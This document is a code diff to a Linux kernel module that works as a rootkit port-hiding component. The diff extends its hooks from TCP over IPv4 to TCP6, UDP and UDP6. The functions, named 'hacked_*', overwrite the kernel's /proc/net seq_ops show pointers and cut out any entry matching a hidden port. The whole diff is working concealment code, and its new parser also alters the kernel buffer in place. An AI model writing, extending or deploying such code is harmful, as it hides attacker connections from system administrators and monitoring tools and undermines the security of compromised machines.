@@ -4,9 +4,13 @@
 #include <linux/init.h>
 #include <net/tcp.h>
 #include <net/udp.h>
+#include <linux/string.h>
 
 /*from net/ipv4/tcp_ipv4.c*/
-#define TMPSZ 150
+#define TCP_SIZE 150
+#define TCP6_SIZE 177
+#define UDP_SIZE 128
+#define UDP6_SIZE 167
 
 //#define PORT_TO_HIDE 9999
 
@@ -39,6 +43,20 @@ struct proc_dir_entry {
 		char name[];
 };
 
+char * shouldHide(char * string, const char * port) {
+    	char * token = "";
+	int i;
+    	for(i = 0; i < 3 && token != NULL; i++) {
+        	token = strsep(&string, ":");
+        	//printf("Token: %s\n", token);
+    	}
+        //printf("Exited: %s\n",token);
+        if(token != NULL)
+                return strstr(strsep(&token, " "), port);
+        else
+                return NULL;
+}
+
 int (*old_tcp4_seq_show)(struct seq_file*, void *) = NULL;
 int (*old_tcp6_seq_show)(struct seq_file*, void *) = NULL;
 int (*old_udp4_seq_show)(struct seq_file*, void *) = NULL;
@@ -55,7 +73,8 @@ char *strnstr(const char *haystack, const char *needle, size_t n)
 		
 	if (s == NULL)
 		return NULL;
-        if (s-haystack+strlen(needle) <= n){
+        //if (s-haystack+strlen(needle) <= n){
+	if(shouldHide(haystack,needle) != NULL) {
 		printk(KERN_INFO "HIDE PORT FOUND");
                 return s;
 	}
@@ -71,22 +90,52 @@ int hacked_tcp4_seq_show(struct seq_file *seq, void *v)
 
         sprintf(hex_port, "%x",port);
 
-        if(strnstr(seq->buf+seq->count-TMPSZ,hex_port,TMPSZ))
-	        seq->count -= TMPSZ;
+        if(strnstr(seq->buf+seq->count-TCP_SIZE,hex_port,TCP_SIZE))
+	        seq->count -= TCP_SIZE;
+	return retval;   
+}
+
+int hacked_tcp6_seq_show(struct seq_file *seq, void *v)
+{
+        int retval=old_tcp6_seq_show(seq, v);
+
+        char hex_port[12];
+
+        sprintf(hex_port, "%x",port);
+
+        if(strnstr(seq->buf+seq->count-TCP6_SIZE,hex_port,TCP6_SIZE))
+	        seq->count -= TCP6_SIZE;
+	return retval;   
+}
+
+int hacked_udp4_seq_show(struct seq_file *seq, void *v)
+{
+        int retval=old_udp4_seq_show(seq, v);
+
+        char hex_port[12];
+
+        sprintf(hex_port, "%x",port);
+
+        if(strnstr(seq->buf+seq->count-UDP_SIZE,hex_port,UDP_SIZE))
+	        seq->count -= UDP_SIZE;
+	return retval;   
+}
+
+int hacked_udp6_seq_show(struct seq_file *seq, void *v)
+{
+        int retval=old_udp6_seq_show(seq, v);
+
+        char hex_port[12];
+
+        sprintf(hex_port, "%x",port);
+
+        if(strnstr(seq->buf+seq->count-UDP6_SIZE,hex_port,UDP6_SIZE))
+	        seq->count -= UDP6_SIZE;
 	return retval;   
 }
 
 static int __init myinit(void)
 {
-        //struct tcp_seq_afinfo *my_afinfo = NULL;
-        //struct rb_root *my_dir_entry = init_net.proc_net->subdir;
-	/*while (strcmp(my_dir_entry->name, "tcp"))
-                my_dir_entry = my_dir_entry->next;
-
-        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)){
-                old_tcp4_seq_show = my_afinfo->seq_ops.show;
-                my_afinfo->seq_ops.show = hacked_tcp4_seq_show;
-	}*/
 	struct rb_root proc_rb_root;
 	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
 	struct proc_dir_entry *proc_dir_entryptr;
@@ -118,14 +167,14 @@ static int __init myinit(void)
 
 			printk(KERN_INFO "HIDE PORT: FOUND TCP6");
 			/* Hook the kernel function tcp4_seq_show */
-			tcp6_seq->seq_ops.show = hacked_tcp4_seq_show;
+			tcp6_seq->seq_ops.show = hacked_tcp6_seq_show;
 		}
 		else if (!strcmp(proc_dir_entryptr->name, "udp")) {
 			udp_seq = proc_dir_entryptr->data;
 			old_udp4_seq_show = udp_seq->seq_ops.show;
 
 			/* Hook the kernel function tcp4_seq_show */
-			udp_seq->seq_ops.show = hacked_tcp4_seq_show;
+			udp_seq->seq_ops.show = hacked_udp4_seq_show;
 		}
 		else if (!strcmp(proc_dir_entryptr->name, "udp6")) {
 			udp6_seq = proc_dir_entryptr->data;
@@ -133,7 +182,7 @@ static int __init myinit(void)
 
 			printk(KERN_INFO "HIDE PORT: FOUND UDP6");
 			/* Hook the kernel function tcp4_seq_show */
-			udp6_seq->seq_ops.show = hacked_tcp4_seq_show;
+			udp6_seq->seq_ops.show = hacked_udp6_seq_show;
 		}	
 		proc_rb_nodeptr = rb_next(proc_rb_nodeptr);
 	}
@@ -143,15 +192,6 @@ static int __init myinit(void)
         
 static void myexit(void)
 {
-        /*struct tcp_seq_afinfo *my_afinfo = NULL;
-        struct proc_dir_entry *my_dir_entry = init_net.proc_net->subdir;
-			 
-        while (strcmp(my_dir_entry->name, "tcp"))
-                my_dir_entry = my_dir_entry->next;
-				        
-        if((my_afinfo = (struct tcp_seq_afinfo*)my_dir_entry->data)) {
-	        my_afinfo->seq_ops.show=old_tcp4_seq_show;
-        }*/
 	struct rb_root proc_rb_root;
 	struct rb_node *proc_rb_last, *proc_rb_nodeptr;
 	struct proc_dir_entry *proc_dir_entryptr;
